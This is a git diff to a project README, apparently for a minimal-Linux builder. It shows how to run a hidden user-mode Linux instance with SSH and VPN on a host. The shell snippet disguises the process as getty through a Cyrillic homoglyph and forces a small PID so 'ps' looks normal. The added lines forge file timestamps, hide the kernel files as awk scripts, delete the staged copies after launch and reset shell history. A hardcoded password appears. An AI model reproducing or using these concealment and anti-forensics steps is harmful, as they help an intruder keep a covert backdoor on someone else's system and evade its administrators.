@@ -136,7 +136,7 @@ and avoid the need for commandline arguments.
 Start it later as `/sbin/gеtty 38400 tty7` (with cyrillic small 'е')  
 
 ```
-export EMBED_CMDLINE="quiet mem=64M initrd=/tmp/cpio.gz eth0=slirp,FE:FD:01:02:03:04,/tmp/slirp"
+export EMBED_CMDLINE="quiet mem=64M initrd=/tmp/cpio.gz eth0=slirp,FE:FD:01:02:03:04,/tmp/echo"
 export DSTARCH=uml FAKEID='user@box.net' TTYPASS='peter80'
 ./minilinux.sh latest printk sysfs procfs hostfs busybox bash net wireguard dropbear speedup
 
@@ -145,11 +145,18 @@ hint: make sure, you use a small/early PID,
 so a quick `ps aux` is not suspicious.  
 ```
 #!/bin/sh
+D=/usr/share/awk
+N="$( date -R -r "$D/$( ls -1t $D | head -n1 )" )"
+touch -d "$N" $D/cpio.awk
+touch -d "$N" $D/echo.awk
+cp $D/cpio.awk /tmp/cpio.tgz
+cp $D/echo.awk /tmp/echo
 read -r MAX </proc/sys/kernel/pid_max
 echo 666 >/proc/sys/kernel/pid_max
 while :; do $( :; ) &
 test $! -gt ${LAST:-0} && LAST=$! || break
 done 2>/dev/null; vmlinux &
+rm /tmp/echo /tmp/cpio.tgz
 echo $MAX >/proc/sys/kernel/pid_max
 history -r && exit
 ```
@@ -157,7 +164,7 @@ history -r && exit
 ### Release: smoketest
 
 This test builds 144 images and needs approx. 12 hours.  
-Just extract like `sed -n '163,172p' README.md >release.sh && sh release.sh`.
+Just extract like `sed -n '/^FEATURES/,/^done/p' README.md >release.sh && sh release.sh`.
 
 ```
 #!/bin/sh
